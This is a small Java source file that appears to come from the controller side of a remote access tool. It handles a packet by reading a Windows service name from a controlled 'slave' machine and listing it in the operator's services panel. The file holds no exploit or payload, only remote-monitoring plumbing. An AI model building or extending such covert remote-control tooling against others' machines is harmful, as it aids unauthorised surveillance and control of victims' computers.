package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlServices;

public class PacketWINSER extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String name = slave.readLine();
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelControlServices panel = (PanelControlServices) frame.panels.get("windows services");
			panel.getModel().addRow(new Object[] { name });
		}
	}

}
